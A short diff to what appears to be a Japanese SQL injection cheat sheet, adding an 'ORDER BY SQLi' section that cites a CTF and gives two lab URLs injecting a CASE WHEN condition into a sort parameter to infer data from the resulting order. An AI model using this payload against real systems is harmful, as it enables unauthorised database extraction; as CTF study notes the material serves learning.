@@ -186,6 +186,18 @@ BEGIN
 END;
 ```
 
+## ORDER BY SQLi
+
+具体例は、Prioritise CTF を参照。
+
+```sh
+# title でソートされる
+http://prioritize.thm/?order=CASE%20WHEN(1=1)%20THEN%20title%20ELSE%20date%20END
+
+# date でソートされる
+http://prioritize.thm/?order=CASE%20WHEN(1=0)%20THEN%20title%20ELSE%20date%20END
+```
+
 ## フィルター回避
 
 ```text
